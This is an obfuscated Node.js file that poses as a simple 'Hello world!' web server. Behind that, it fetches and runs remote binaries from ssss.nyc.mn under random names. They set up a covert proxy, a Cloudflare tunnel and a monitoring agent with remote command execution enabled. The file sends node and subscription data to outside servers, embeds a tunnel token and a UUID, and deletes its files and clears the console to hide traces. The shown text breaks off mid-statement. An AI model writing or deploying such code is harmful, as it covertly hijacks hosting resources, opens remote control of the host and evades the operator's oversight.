const _0x1eef6b=_0x3fa1;(function(_0x488513,_0x2f5069){const _0x466f8f=_0x3fa1,_0x19eb2b=_0x488513();while(!![]){try{const _0xf1ea32=parseInt(_0x466f8f(0x150))/0x1+-parseInt(_0x466f8f(0x157))/0x2*(-parseInt(_0x466f8f(0x102))/0x3)+-parseInt(_0x466f8f(0x117))/0x4*(parseInt(_0x466f8f(0x14c))/0x5)+parseInt(_0x466f8f(0x143))/0x6*(-parseInt(_0x466f8f(0x12d))/0x7)+-parseInt(_0x466f8f(0x18a))/0x8+parseInt(_0x466f8f(0x128))/0x9+-parseInt(_0x466f8f(0x132))/0xa;if(_0xf1ea32===_0x2f5069)break;else _0x19eb2b['push'](_0x19eb2b['shift']());}catch(_0x94948a){_0x19eb2b['push'](_0x19eb2b['shift']());}}}(_0x4f01,0x2fa2b));function _0x3fa1(_0x39ebaa,_0x29e65c){_0x39ebaa=_0x39ebaa-0xfe;const _0x4f012f=_0x4f01();let _0x3fa129=_0x4f012f[_0x39ebaa];return _0x3fa129;}const express=require(_0x1eef6b(0x14d)),app=express(),axios=require(_0x1eef6b(0x146)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x1eef6b(0x101)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x1eef6b(0x156)),UPLOAD_URL=process[_0x1eef6b(0x194)][_0x1eef6b(0x14f)]||'',PROJECT_URL=process[_0x1eef6b(0x194)][_0x1eef6b(0x170)]||'',AUTO_ACCESS=process[_0x1eef6b(0x194)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x1eef6b(0x194)][_0x1eef6b(0x108)]||_0x1eef6b(0x115),SUB_PATH=process['env'][_0x1eef6b(0x159)]||'sub',PORT=process['env'][_0x1eef6b(0x16c)]||process[_0x1eef6b(0x194)][_0x1eef6b(0x176)]||0xbb8,UUID=process[_0x1eef6b(0x194)][_0x1eef6b(0x154)]||_0x1eef6b(0x1c0),NEZHA_SERVER=process[_0x1eef6b(0x194)][_0x1eef6b(0x158)]||'',NEZHA_PORT=process[_0x1eef6b(0x194)][_0x1eef6b(0x161)]||'',NEZHA_KEY=process['env'][_0x1eef6b(0x119)]||'',ARGO_DOMAIN=process['env'][_0x1eef6b(0x107)]||_0x1eef6b(0x13a),ARGO_AUTH=process[_0x1eef6b(0x194)][_0x1eef6b(0x17e)]||_0x1eef6b(0x1a6),ARGO_PORT=process[_0x1eef6b(0x194)][_0x1eef6b(0x181)]||0x1f41,CFIP=process[_0x1eef6b(0x194)][_0x1eef6b(0x162)]||_0x1eef6b(0x187),CFPORT=process[_0x1eef6b(0x194)][_0x1eef6b(0x16e)]||0x1bb,NAME=process[_0x1eef6b(0x194)][_0x1eef6b(0x149)]||'diduo8';!fs[_0x1eef6b(0x1be)](FILE_PATH)?(fs[_0x1eef6b(0x10f)](FILE_PATH),console[_0x1eef6b(0x1b8)](FILE_PATH+_0x1eef6b(0x105))):console[_0x1eef6b(0x1b8)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x393108=_0x1eef6b,_0x726884='abcdefghijklmnopqrstuvwxyz';let _0x1557a3='';for(let _0x1e6b03=0x0;_0x1e6b03<0x6;_0x1e6b03++){_0x1557a3+=_0x726884[_0x393108(0x169)](Math[_0x393108(0x13c)](Math[_0x393108(0x131)]()*_0x726884['length']));}return _0x1557a3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1eef6b(0x1bb)](FILE_PATH,npmName),phpPath=path[_0x1eef6b(0x1bb)](FILE_PATH,phpName),webPath=path[_0x1eef6b(0x1bb)](FILE_PATH,webName),botPath=path[_0x1eef6b(0x1bb)](FILE_PATH,botName),subPath=path[_0x1eef6b(0x1bb)](FILE_PATH,_0x1eef6b(0x130)),listPath=path[_0x1eef6b(0x1bb)](FILE_PATH,_0x1eef6b(0x111)),bootLogPath=path[_0x1eef6b(0x1bb)](FILE_PATH,'boot.log'),configPath=path[_0x1eef6b(0x1bb)](FILE_PATH,_0x1eef6b(0x1ad));function deleteNodes(){const _0x2a54a2=_0x1eef6b;try{if(!UPLOAD_URL)return;if(!fs[_0x2a54a2(0x1be)](subPath))return;let _0x2e33f6;try{_0x2e33f6=fs[_0x2a54a2(0x1ac)](subPath,'utf-8');}catch{return null;}const _0x196cd7=Buffer['from'](_0x2e33f6,_0x2a54a2(0x123))[_0x2a54a2(0x137)](_0x2a54a2(0x17f)),_0x1b3ebd=_0x196cd7[_0x2a54a2(0x133)]('\x0a')[_0x2a54a2(0x152)](_0x549285=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2a54a2(0x1aa)](_0x549285));if(_0x1b3ebd[_0x2a54a2(0x145)]===0x0)return;return axios[_0x2a54a2(0x139)](UPLOAD_URL+_0x2a54a2(0x10a),JSON['stringify']({'nodes':_0x1b3ebd}),{'headers':{'Content-Type':'application/json'}})[_0x2a54a2(0x11c)](_0x1401cb=>{return null;}),null;}catch(_0x58ae02){return null;}}function cleanupOldFiles(){const _0xc12db1=_0x1eef6b;try{const _0x17ee9d=fs[_0xc12db1(0x113)](FILE_PATH);_0x17ee9d[_0xc12db1(0x109)](_0xae3b58=>{const _0x4eb465=_0xc12db1,_0x451b64=path[_0x4eb465(0x1bb)](FILE_PATH,_0xae3b58);try{const _0x1bc6c1=fs[_0x4eb465(0x172)](_0x451b64);_0x1bc6c1[_0x4eb465(0x1a8)]()&&fs[_0x4eb465(0x110)](_0x451b64);}catch(_0x28418b){}});}catch(_0x5e6627){}}app[_0x1eef6b(0x178)]('/',function(_0x18a0c7,_0x25fd4e){const _0x4800e2=_0x1eef6b;_0x25fd4e[_0x4800e2(0x196)](_0x4800e2(0x148));});async function generateConfig(){const _0x35bd9e=_0x1eef6b,_0x142e92={'log':{'access':'/dev/null','error':_0x35bd9e(0x10b),'loglevel':_0x35bd9e(0x1b0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x35bd9e(0x1b5),'settings':{'clients':[{'id':UUID,'flow':_0x35bd9e(0x1a1)}],'decryption':_0x35bd9e(0x1b0),'fallbacks':[{'dest':0xbb9},{'path':_0x35bd9e(0x17a),'dest':0xbba},{'path':_0x35bd9e(0x1a7),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x35bd9e(0x120)}},{'port':0xbb9,'listen':_0x35bd9e(0x1b4),'protocol':_0x35bd9e(0x1b5),'settings':{'clients':[{'id':UUID}],'decryption':_0x35bd9e(0x1b0)},'streamSettings':{'network':_0x35bd9e(0x120),'security':_0x35bd9e(0x1b0)}},{'port':0xbba,'listen':_0x35bd9e(0x1b4),'protocol':_0x35bd9e(0x1b5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x35bd9e(0x1b0)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x35bd9e(0x17a)}},'sniffing':{'enabled':!![],'destOverride':[_0x35bd9e(0x168),_0x35bd9e(0x114),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x35bd9e(0xff),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x35bd9e(0x1a7)}},'sniffing':{'enabled':!![],'destOverride':[_0x35bd9e(0x168),_0x35bd9e(0x114),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x35bd9e(0x1b4),'protocol':_0x35bd9e(0x1ab),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x35bd9e(0x1b0),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x35bd9e(0x168),_0x35bd9e(0x114),_0x35bd9e(0x1a3)],'metadataOnly':![]}}],'dns':{'servers':[_0x35bd9e(0x1a5)]},'outbounds':[{'protocol':_0x35bd9e(0x11a),'tag':_0x35bd9e(0x193)},{'protocol':'blackhole','tag':_0x35bd9e(0x15d)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x35bd9e(0x1ad)),JSON[_0x35bd9e(0x189)](_0x142e92,null,0x2));}function getSystemArchitecture(){const _0x34312a=_0x1eef6b,_0x582fcb=os[_0x34312a(0x165)]();return _0x582fcb==='arm'||_0x582fcb===_0x34312a(0x11d)||_0x582fcb==='aarch64'?'arm':_0x34312a(0x18e);}function downloadFile(_0x2d985d,_0x1c05db,_0x3f10e6){const _0x541e31=_0x1eef6b,_0x4f0b55=_0x2d985d;!fs[_0x541e31(0x1be)](FILE_PATH)&&fs[_0x541e31(0x10f)](FILE_PATH,{'recursive':!![]});const _0x5935e1=fs[_0x541e31(0x103)](_0x4f0b55);axios({'method':_0x541e31(0x178),'url':_0x1c05db,'responseType':_0x541e31(0x141)})[_0x541e31(0x134)](_0x403cbf=>{const _0x2d04c0=_0x541e31;_0x403cbf[_0x2d04c0(0x13e)][_0x2d04c0(0x15b)](_0x5935e1),_0x5935e1['on'](_0x2d04c0(0x1a2),()=>{const _0x563656=_0x2d04c0;_0x5935e1[_0x563656(0x12f)](),console[_0x563656(0x1b8)](_0x563656(0x16f)+path['basename'](_0x4f0b55)+_0x563656(0x1c2)),_0x3f10e6(null,_0x4f0b55);}),_0x5935e1['on']('error',_0x50cf80=>{const _0x27633e=_0x2d04c0;fs['unlink'](_0x4f0b55,()=>{});const _0x23c701=_0x27633e(0x16f)+path[_0x27633e(0x1b9)](_0x4f0b55)+_0x27633e(0x12b)+_0x50cf80[_0x27633e(0x197)];console['error'](_0x23c701),_0x3f10e6(_0x23c701);});})[_0x541e31(0x11c)](_0x392ca6=>{const _0xa60d86=_0x541e31,_0x11d52d=_0xa60d86(0x16f)+path['basename'](_0x4f0b55)+'\x20failed:\x20'+_0x392ca6[_0xa60d86(0x197)];console['error'](_0x11d52d),_0x3f10e6(_0x11d52d);});}async function downloadFilesAndRun(){const _0xcd61a=_0x1eef6b,_0x36b7cb=getSystemArchitecture(),_0x3c497a=getFilesForArchitecture(_0x36b7cb);if(_0x3c497a[_0xcd61a(0x145)]===0x0){console[_0xcd61a(0x1b8)](_0xcd61a(0x18d));return;}const _0x14bb44=_0x3c497a[_0xcd61a(0x19c)](_0x5e1145=>{return new Promise((_0x28fc35,_0x3c40e4)=>{const _0x48a6a6=_0x3fa1;downloadFile(_0x5e1145[_0x48a6a6(0x164)],_0x5e1145[_0x48a6a6(0x195)],(_0x5c94fc,_0x35645a)=>{_0x5c94fc?_0x3c40e4(_0x5c94fc):_0x28fc35(_0x35645a);});});});try{await Promise[_0xcd61a(0x1a0)](_0x14bb44);}catch(_0x4b668f){console[_0xcd61a(0x127)]('Error\x20downloading\x20files:',_0x4b668f);return;}function _0x589c5d(_0x59c890){const _0x488116=_0xcd61a,_0x33dc2b=0x1fd;_0x59c890[_0x488116(0x109)](_0x2c2127=>{const _0x586eb4=_0x488116;fs['existsSync'](_0x2c2127)&&fs[_0x586eb4(0x10c)](_0x2c2127,_0x33dc2b,_0x2c2f92=>{const _0x28482a=_0x586eb4;_0x2c2f92?console['error'](_0x28482a(0x14e)+_0x2c2127+':\x20'+_0x2c2f92):console[_0x28482a(0x1b8)]('Empowerment\x20success\x20for\x20'+_0x2c2127+':\x20'+_0x33dc2b[_0x28482a(0x137)](0x8));});});}const _0x21b369=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x589c5d(_0x21b369);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3a8cfa=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0xcd61a(0x121)]():'',_0x4a5eaa=new Set([_0xcd61a(0x136),'8443',_0xcd61a(0x1af),_0xcd61a(0x10e),'2083',_0xcd61a(0x15f)]),_0xd11920=_0x4a5eaa['has'](_0x3a8cfa)?_0xcd61a(0x1ae):_0xcd61a(0x186),_0x38b73a=_0xcd61a(0x16a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xcd61a(0x1b3)+_0xd11920+_0xcd61a(0x18c)+UUID;fs[_0xcd61a(0x11b)](path[_0xcd61a(0x1bb)](FILE_PATH,_0xcd61a(0xfe)),_0x38b73a);const _0x273292=_0xcd61a(0x171)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x273292),console[_0xcd61a(0x1b8)](phpName+'\x20is\x20running'),await new Promise(_0x3a918a=>setTimeout(_0x3a918a,0x3e8));}catch(_0x8f5845){console['error'](_0xcd61a(0x163)+_0x8f5845);}}else{let _0x5571fa='';const _0x3656c2=[_0xcd61a(0x136),_0xcd61a(0x1c3),'2096',_0xcd61a(0x10e),_0xcd61a(0x13b),_0xcd61a(0x15f)];_0x3656c2[_0xcd61a(0x1bf)](NEZHA_PORT)&&(_0x5571fa=_0xcd61a(0x13f));const _0x4af8b0='nohup\x20'+npmPath+_0xcd61a(0x19f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5571fa+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4af8b0),console[_0xcd61a(0x1b8)](npmName+_0xcd61a(0x179)),await new Promise(_0x1ccd7f=>setTimeout(_0x1ccd7f,0x3e8));}catch(_0x340560){console[_0xcd61a(0x127)](_0xcd61a(0x180)+_0x340560);}}}else console[_0xcd61a(0x1b8)](_0xcd61a(0x1bd));const _0x4ae0cb='nohup\x20'+webPath+_0xcd61a(0x1b2)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4ae0cb),console[_0xcd61a(0x1b8)](webName+_0xcd61a(0x179)),await new Promise(_0x4e78ef=>setTimeout(_0x4e78ef,0x3e8));}catch(_0x50b42b){console['error'](_0xcd61a(0x153)+_0x50b42b);}if(fs[_0xcd61a(0x1be)](botPath)){let _0x2eb592;if(ARGO_AUTH[_0xcd61a(0x1c1)](/^[A-Z0-9a-z=]{120,250}$/))_0x2eb592=_0xcd61a(0x18f)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2eb592=_0xcd61a(0x147)+FILE_PATH+'/tunnel.yml\x20run':_0x2eb592='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xcd61a(0x171)+botPath+'\x20'+_0x2eb592+_0xcd61a(0x116)),console[_0xcd61a(0x1b8)](botName+_0xcd61a(0x179)),await new Promise(_0x52f62e=>setTimeout(_0x52f62e,0x7d0));}catch(_0x42333a){console[_0xcd61a(0x127)](_0xcd61a(0x15a)+_0x42333a);}}await new Promise(_0x4f43e9=>setTimeout(_0x4f43e9,0x1388));}function getFilesForArchitecture(_0x492443){const _0x205411=_0x1eef6b;let _0x10d9fe;_0x492443===_0x205411(0x13d)?_0x10d9fe=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x205411(0x17d)}]:_0x10d9fe=[{'fileName':webPath,'fileUrl':_0x205411(0x175)},{'fileName':botPath,'fileUrl':_0x205411(0x17c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x19d138=_0x492443==='arm'?_0x205411(0x1b1):'https://amd64.ssss.nyc.mn/agent';_0x10d9fe[_0x205411(0x1a9)]({'fileName':npmPath,'fileUrl':_0x19d138});}else{const _0x4fb676=_0x492443===_0x205411(0x13d)?'https://arm64.ssss.nyc.mn/v1':_0x205411(0x106);_0x10d9fe[_0x205411(0x1a9)]({'fileName':phpPath,'fileUrl':_0x4fb676});}}return _0x10d9fe;}function argoType(){const _0x5c2df9=_0x1eef6b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5c2df9(0x1b8)](_0x5c2df9(0x192));return;}if(ARGO_AUTH[_0x5c2df9(0x1bf)](_0x5c2df9(0x190))){fs[_0x5c2df9(0x11b)](path[_0x5c2df9(0x1bb)](FILE_PATH,_0x5c2df9(0x1a4)),ARGO_AUTH);const _0x93ae52=_0x5c2df9(0x19e)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x5c2df9(0x1a4))+_0x5c2df9(0x129)+ARGO_DOMAIN+_0x5c2df9(0x11e)+ARGO_PORT+_0x5c2df9(0x14b);fs['writeFileSync'](path['join'](FILE_PATH,_0x5c2df9(0x19b)),_0x93ae52);}else console[_0x5c2df9(0x1b8)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3c3520=_0x1eef6b;let _0x246971;if(ARGO_AUTH&&ARGO_DOMAIN)_0x246971=ARGO_DOMAIN,console[_0x3c3520(0x1b8)]('ARGO_DOMAIN:',_0x246971),await _0x33352b(_0x246971);else try{const _0x20b743=fs[_0x3c3520(0x1ac)](path[_0x3c3520(0x1bb)](FILE_PATH,'boot.log'),_0x3c3520(0x17f)),_0x143d85=_0x20b743[_0x3c3520(0x133)]('\x0a'),_0x3909c7=[];_0x143d85[_0x3c3520(0x109)](_0x5d421c=>{const _0x2d6ad3=_0x3c3520,_0x4faf40=_0x5d421c['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4faf40){const _0x4001ec=_0x4faf40[0x1];_0x3909c7[_0x2d6ad3(0x199)](_0x4001ec);}});if(_0x3909c7[_0x3c3520(0x145)]>0x0)_0x246971=_0x3909c7[0x0],console[_0x3c3520(0x1b8)](_0x3c3520(0x122),_0x246971),await _0x33352b(_0x246971);else{console[_0x3c3520(0x1b8)](_0x3c3520(0x188)),fs[_0x3c3520(0x110)](path[_0x3c3520(0x1bb)](FILE_PATH,_0x3c3520(0x11f)));async function _0x360034(){const _0x42d179=_0x3c3520;try{process['platform']===_0x42d179(0x112)?await exec(_0x42d179(0x160)+botName+_0x42d179(0x17b)):await exec(_0x42d179(0x144)+botName['charAt'](0x0)+']'+botName[_0x42d179(0x19a)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x218b8c){}}_0x360034(),await new Promise(_0x1c0173=>setTimeout(_0x1c0173,0xbb8));const _0x13006f=_0x3c3520(0x126)+FILE_PATH+_0x3c3520(0x16b)+ARGO_PORT;try{await exec(_0x3c3520(0x171)+botPath+'\x20'+_0x13006f+_0x3c3520(0x116)),console[_0x3c3520(0x1b8)](botName+_0x3c3520(0x179)),await new Promise(_0x443941=>setTimeout(_0x443941,0xbb8)),await extractDomains();}catch(_0x343fbf){console['error'](_0x3c3520(0x15a)+_0x343fbf);}}}catch(_0x29a803){console[_0x3c3520(0x127)](_0x3c3520(0x182),_0x29a803);}async function _0x3fe1ba(){const _0x5e6f69=_0x3c3520;try{const _0x9441d5=await axios[_0x5e6f69(0x178)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x9441d5[_0x5e6f69(0x13e)]&&_0x9441d5[_0x5e6f69(0x13e)]['country_code']&&_0x9441d5[_0x5e6f69(0x13e)][_0x5e6f69(0x142)])return _0x9441d5[_0x5e6f69(0x13e)][_0x5e6f69(0x124)]+'_'+_0x9441d5[_0x5e6f69(0x13e)][_0x5e6f69(0x142)];}catch(_0x643281){try{const _0x19fba1=await axios[_0x5e6f69(0x178)](_0x5e6f69(0x15e),{'timeout':0xbb8});if(_0x19fba1[_0x5e6f69(0x13e)]&&_0x19fba1[_0x5e6f69(0x13e)][_0x5e6f69(0x118)]===_0x5e6f69(0x135)&&_0x19fba1[_0x5e6f69(0x13e)][_0x5e6f69(0x167)]&&_0x19fba1['data']['org'])return _0x19fba1['data']['countryCode']+'_'+_0x19fba1['data'][_0x5e6f69(0x142)];}catch(_0x39659a){}}return _0x5e6f69(0x198);}async function _0x33352b(_0x2c9445){const _0x99a663=await _0x3fe1ba(),_0x4b5944=NAME?NAME+'-'+_0x99a663:_0x99a663;return new Promise(_0xc216c8=>{setTimeout(()=>{const _0x5adad8=_0x3fa1,_0x539b1e={'v':'2','ps':''+_0x4b5944,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5adad8(0x1b0),'net':'ws','type':_0x5adad8(0x1b0),'host':_0x2c9445,'path':'/vmess-argo?ed=2560','tls':_0x5adad8(0x114),'sni':_0x2c9445,'alpn':'','fp':_0x5adad8(0x12c)},_0x505985=_0x5adad8(0x174)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2c9445+_0x5adad8(0x16d)+_0x2c9445+_0x5adad8(0x1b6)+_0x4b5944+_0x5adad8(0x138)+Buffer[_0x5adad8(0x191)](JSON['stringify'](_0x539b1e))['toString'](_0x5adad8(0x123))+_0x5adad8(0x14a)+UUID+'@'+CFIP+':'+CFPORT+_0x5adad8(0x173)+_0x2c9445+'&fp=firefox&type=ws&host='+_0x2c9445+_0x5adad8(0x151)+_0x4b5944+_0x5adad8(0x166);console[_0x5adad8(0x1b8)](Buffer[_0x5adad8(0x191)](_0x505985)[_0x5adad8(0x137)](_0x5adad8(0x123))),fs[_0x5adad8(0x11b)](subPath,Buffer['from'](_0x505985)[_0x5adad8(0x137)](_0x5adad8(0x123))),console['log'](FILE_PATH+_0x5adad8(0x125)),uploadNodes(),app[_0x5adad8(0x178)]('/'+SUB_PATH,(_0x4d6f71,_0x26a0c1)=>{const _0x49099f=_0x5adad8,_0x614209=Buffer[_0x49099f(0x191)](_0x505985)['toString'](_0x49099f(0x123));_0x26a0c1[_0x49099f(0x100)]('Content-Type',_0x49099f(0x183)),_0x26a0c1[_0x49099f(0x196)](_0x614209);}),_0xc216c8(_0x505985);},0x7d0);});}}async function uploadNodes(){const _0x4cd935=_0x1eef6b;if(UPLOAD_URL&&PROJECT_URL){const _0x54338a=PROJECT_URL+'/'+SUB_PATH,_0x54f479={'subscription':[_0x54338a]};try{const _0x317711=await axios[_0x4cd935(0x139)](UPLOAD_URL+_0x4cd935(0x184),_0x54f479,{'headers':{'Content-Type':_0x4cd935(0x185)}});return _0x317711&&_0x317711[_0x4cd935(0x118)]===0xc8?(console[_0x4cd935(0x1b8)](_0x4cd935(0x10d)),_0x317711):null;}catch(_0x1fd7b5){if(_0x1fd7b5[_0x4cd935(0x12e)]){if(_0x1fd7b5[_0x4cd935(0x12e)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4cd935(0x1be)](listPath))return;const _0x3a66e8=fs[_0x4cd935(0x1ac)](listPath,_0x4cd935(0x17f)),_0x642332=_0x3a66e8[_0x4cd935(0x133)]('\x0a')[_0x4cd935(0x152)](_0x4d9a93=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4cd935(0x1aa)](_0x4d9a93));if(_0x642332[_0x4cd935(0x145)]===0x0)return;const _0x217ecb=JSON[_0x4cd935(0x189)]({'nodes':_0x642332});try{const _0x41b52e=await axios[_0x4cd935(0x139)](UPLOAD_URL+'/api/add-nodes',_0x217ecb,{'headers':{'Content-Type':_0x4cd935(0x185)}});return _0x41b52e&&_0x41b52e['status']===0xc8?(console['log'](_0x4cd935(0x140)),_0x41b52e):null;}catch(_0x3698ed){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x514a19=_0x3fa1,_0x1bf039=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1bf039['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1bf039['push'](phpPath);process[_0x514a19(0x1ba)]===_0x514a19(0x112)?exec('del\x20/f\x20/q\x20'+_0x1bf039['join']('\x20')+_0x514a19(0x15c),_0x159085=>{const _0x1203fd=_0x514a19;console['clear'](),console[_0x1203fd(0x1b8)](_0x1203fd(0x155)),console[_0x1203fd(0x1b8)](_0x1203fd(0x104));}):exec('rm\x20-rf\x20'+_0x1bf039[_0x514a19(0x1bb)]('\x20')+_0x514a19(0x18b),_0x1ae615=>{const _0x1c2e0f=_0x514a19;console[_0x1c2e0f(0x1b7)](),console[_0x1c2e0f(0x1b8)](_0x1c2e0f(0x155)),console['log'](_0x1c2e0f(0x104));});},0x15f90);}cleanFiles();function _0x4f01(){const _0x4709f3=['15HuDoBi','express','Empowerment\x20failed\x20for\x20','UPLOAD_URL','326713xSaLmm','&path=%2Ftrojan-argo%3Fed%3D2560#','filter','web\x20running\x20error:\x20','UUID','App\x20is\x20running','child_process','10UGEISL','NEZHA_SERVER','SUB_PATH','Error\x20executing\x20command:\x20','pipe','\x20>\x20nul\x202>&1','block','http://ip-api.com/json/','2053','taskkill\x20/f\x20/im\x20','NEZHA_PORT','CFIP','php\x20running\x20error:\x20','fileName','arch','\x0a\x20\x20\x20\x20','countryCode','http','charAt','\x0aclient_secret:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','SERVER_PORT','&fp=firefox&type=ws&host=','CFPORT','Download\x20','PROJECT_URL','nohup\x20','statSync','?security=tls&sni=','\x0avless://','https://amd64.ssss.nyc.mn/web','PORT','Skipping\x20adding\x20automatic\x20access\x20task','get','\x20is\x20running','/vless-argo','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/bot','ARGO_AUTH','utf-8','npm\x20running\x20error:\x20','ARGO_PORT','Error\x20reading\x20boot.log:','text/plain;\x20charset=utf-8','/api/add-subscriptions','application/json','false','cdns.doon.eu.org','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','stringify','2900632tIpeFT','\x20>/dev/null\x202>&1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','amd','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','TunnelSecret','from','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','direct','env','fileUrl','send','message','Unknown','push','substring','tunnel.yml','map','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20tunnel:\x20','\x20-s\x20','all','xtls-rprx-vision','finish','quic','tunnel.json','https+local://8.8.8.8/dns-query','eyJhIjoiMzE0YTJjNWUwNjA3NGMwNWZlNTlhMTI3ODY4NWVhYjgiLCJ0IjoiYzdmYWNiYjctMzEzZS00NDVlLWE4MGItNWExNDVlNzA1MmFhIiwicyI6Ik1UUTROalV4WXpVdE1XTmlaaTAwTWprNUxUZzRPVGN0WXpKak16VXlOalE1TjJNNSJ9','/vmess-argo','isFile','unshift','test','trojan','readFileSync','config.json','true','2096','none','https://arm64.ssss.nyc.mn/agent','\x20-c\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','127.0.0.1','vless','&path=%2Fvless-argo%3Fed%3D2560#','clear','log','basename','platform','join','listen','NEZHA\x20variable\x20is\x20empty,skip\x20running','existsSync','includes','4198e4b2-bd57-49fb-a83e-50027090a375','match','\x20successfully','8443','config.yaml','vmess','set','util','202773IGjzHY','createWriteStream','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20is\x20created','https://amd64.ssss.nyc.mn/v1','ARGO_DOMAIN','FILE_PATH','forEach','/api/delete-nodes','/dev/null','chmod','Subscription\x20uploaded\x20successfully','2087','mkdirSync','unlinkSync','list.txt','win32','readdirSync','tls','./tmp','\x20>/dev/null\x202>&1\x20&','64436GcjgOk','status','NEZHA_KEY','freedom','writeFileSync','catch','arm64','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','boot.log','tcp','pop','ArgoDomain:','base64','country_code','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','error','1332684pehKYQ','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','automatic\x20access\x20task\x20added\x20successfully','\x20failed:\x20','firefox','47194BSIUqh','response','close','sub.txt','random','1595290EGrNXk','split','then','success','443','toString','\x0a\x0avmess://','post','diduo.diduo.de5.net','2083','floor','arm','data','--tls','Nodes\x20uploaded\x20successfully','stream','org','42AnLphZ','pkill\x20-f\x20\x22[','length','axios','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Hello\x20world!','NAME','\x0a\x0atrojan://','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'];_0x4f01=function(){return _0x4709f3;};return _0x4f01();}async function AddVisitTask(){const _0x9bbbc1=_0x1eef6b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x9bbbc1(0x1b8)](_0x9bbbc1(0x177));return;}try{const _0x39f963=await axios[_0x9bbbc1(0x139)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x9bbbc1(0x185)}});return console[_0x9bbbc1(0x1b8)](_0x9bbbc1(0x12a)),_0x39f963;}catch(_0x562cac){return console[_0x9bbbc1(0x127)](_0x9bbbc1(0x19d)+_0x562cac[_0x9bbbc1(0x197)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await 